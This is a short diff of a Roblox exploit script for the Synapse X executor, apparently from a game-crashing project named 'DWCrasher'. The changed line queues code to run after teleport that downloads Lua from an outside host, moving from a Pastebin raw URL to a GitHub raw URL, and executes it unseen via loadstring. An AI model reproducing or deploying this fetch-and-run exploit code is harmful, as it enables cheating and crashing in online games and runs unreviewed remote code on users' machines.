@@ -1,5 +1,5 @@
 repeat wait() until game:IsLoaded()
-syn.queue_on_teleport([[loadstring(game:HttpGet("https://pastebin.com/raw/PjGKfPiF", true))()]])
+syn.queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/Idktbh12z/DWCrasher/main/zz.lua", true))()]])
 local trees = false
 print("executed")
 for _,v in pairs(game.Workspace:GetDescendants()) do
